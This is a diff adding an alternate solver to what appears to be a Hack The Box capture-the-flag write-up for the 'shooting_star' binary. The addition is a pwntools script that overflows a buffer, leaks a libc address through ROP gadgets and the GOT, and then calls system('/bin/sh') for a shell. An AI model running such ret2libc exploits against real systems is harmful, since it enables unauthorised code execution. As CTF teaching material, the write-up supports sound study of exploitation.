@@ -469,5 +469,91 @@ sh.interactive()
 HTB{1_w1sh_pwn_w4s_th1s_e4sy}
 ```
 
+## ALTERNATE SOLVER
+
+```py
+import os
+from pwn import *
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './shooting_star'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = start()
+
+padding = b'A' * 72
+
+pop_rdi = 0x00000000004012cb
+info('pop_rdi_gadget --> %#0x', pop_rdi)
+
+pop_rsi_r15 = 0x00000000004012c9
+info('pop rsi r15 --> %#0x', pop_rsi_r15)
+
+p = flat([
+    padding,
+    pop_rsi_r15,
+    elf.got['write'],
+    0x0,
+    elf.plt['write'],
+    elf.sym['main']
+])
+
+sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>>', p)
+sh.recvline()
+sh.recvline()
+get = sh.recv()
+
+print('[+] Grabbed leaked libc addr -->', get)
+
+#strip_it = get.strip()
+#print('This is the stripped ones -->', strip_it)
+
+leaked = get[:6]
+print('Grabbed leaked -->', leaked)
+leaked_libc = unpack(leaked.ljust(8,b'\x00'))
+info('This is the leaked libc_address --> %#0x', leaked_libc)
+
+#leaked = unpack(strip_it.ljust(8, b'\x00'))
+#print(leaked)
+
+#library = './libc6_2.5-0ubuntu14_i386.so'
+library = './libc6_2.27-3ubuntu1.4_amd64.so'
+libc = context.binary = ELF(library, checksec=False)
+
+info('libc_write --> %#0x', libc.sym['write'])
+
+libc_base = leaked_libc - libc.sym['write']
+info('libc_base --> %#0x', libc_base)
+
+system_addr = libc_base + 0x000000000004f550
+info('system_addr --> %#0x', system_addr)
+
+binsh_addr = libc_base + 0x1b3e1a
+info('binsh_addr --> %#0x', binsh_addr)
+
+pay = flat([
+    padding,
+    pop_rdi,
+    binsh_addr,
+    system_addr
+])
+
+sh.sendline(b'1')
+#sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>>', pay)
+
+sh.interactive()
+```
+
+#### NOTES: It failed locally, but succeed remotely. (the problem still the same as before, the remote libc library used is different).
 
 
